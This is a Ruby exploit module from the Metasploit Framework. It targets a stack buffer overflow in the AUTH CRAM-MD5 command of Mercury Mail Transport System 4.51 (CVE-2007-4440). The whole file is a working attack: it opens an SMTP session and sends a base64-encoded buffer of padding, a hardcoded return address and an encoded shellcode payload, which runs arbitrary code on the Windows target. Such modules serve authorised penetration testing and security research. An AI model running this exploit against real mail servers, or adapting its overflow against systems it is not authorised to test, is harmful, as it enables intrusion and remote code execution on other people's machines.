##
# $Id: mercury_cram_md5.rb 9583 2010-06-22 19:11:05Z todb $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Mercury Mail SMTP AUTH CRAM-MD5 Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Mercury Mail Transport System 4.51.
				By sending a specially crafted argument to the AUTH CRAM-MD5 command, an attacker
				may be able to execute arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 9583 $',
			'References'     =>
				[
					[ 'CVE', '2007-4440' ],
					[ 'OSVDB', '39669' ],
					[ 'BID', '25357' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Platform'       => 'win',
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 600,
					'BadChars' => "\x00\x0a\x0d\x20\x25",
					'StackAdjustment' => -3500,
				},
			'Targets'        =>
				[
					[ 'Mercury Mail Transport System 4.51',	{ 'Ret' => 0x258d0d1e } ], # ter32.dll
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Aug 18 2007'))

		register_options([ Opt::RPORT(25) ], self.class)
	end

	def exploit
		connect

		sock.get_once

		sock.put("EHLO\r\n")

		sock.get_once

		sock.put("AUTH CRAM-MD5\r\n")

		sock.get_once
		select(nil,nil,nil,0.25)

		buffer =  rand_text_alpha_upper(204) + [target.ret].pack('V')
		buffer << payload.encoded + rand_text_alpha_upper(1075 - payload.encoded.length)

		sploit = Rex::Text.encode_base64(buffer)

		print_status("Trying target #{target.name}...")
		sock.put(sploit + "\r\n")

		handler
		disconnect
	end

end
